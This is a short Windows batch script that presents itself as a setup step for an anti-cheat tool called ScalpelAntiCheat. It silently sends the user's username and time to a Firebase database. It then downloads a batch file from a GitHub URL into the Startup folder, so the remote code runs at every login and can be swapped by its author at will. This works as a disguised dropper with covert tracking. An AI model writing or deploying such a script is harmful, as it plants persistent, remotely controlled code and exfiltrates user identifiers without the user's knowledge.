@echo off
rem set dir = C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat

curl -X PUT -d "{\"time\": \"%time%\"}" -H "Content-type: application/json" https://antimod-d4fb9-default-rtdb.firebaseio.com/user/%username%.json
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat
md C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat